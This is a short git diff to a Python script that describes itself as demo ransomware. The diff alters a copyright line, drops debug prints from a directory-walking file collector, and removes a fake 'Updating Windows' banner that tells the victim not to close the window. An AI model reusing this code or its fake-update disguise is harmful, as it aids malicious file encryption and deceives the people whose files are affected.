@@ -24,7 +24,7 @@ THIS FILE IS A RANSOMWARE. IT WILL DECRYPT ALL FILES IN THE SPECIFIED LOCATION W
 RESTORING THEM. I AM NOT LIABLE FOR MISUSE OF THIS SCRIPT. IT IS INTENDED FOR DEMO PURPOSES!
 """
 """
-Copyright (C) 2023  EchterAlsFake | Johannes Habel
+Copyright (C) 2023 EchterAlsFake Johannes Habel
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -66,10 +66,8 @@ def decrypt(filename):
 
 
 def get_all_files(start_path):
-    print(start_path)
     all_files = []
     for path in start_path:
-        print(path)
         for root, dirs, files in os.walk(path):
             for file in files:
                 # construct full file path
@@ -89,5 +87,3 @@ def execute():
 if __name__ == "__main__":
     t1 = threading.Thread(target=execute)
     t1.start()
-
-    print("Updating Windows to KB-2023-11-26.v231 Please do NOT close this window!")
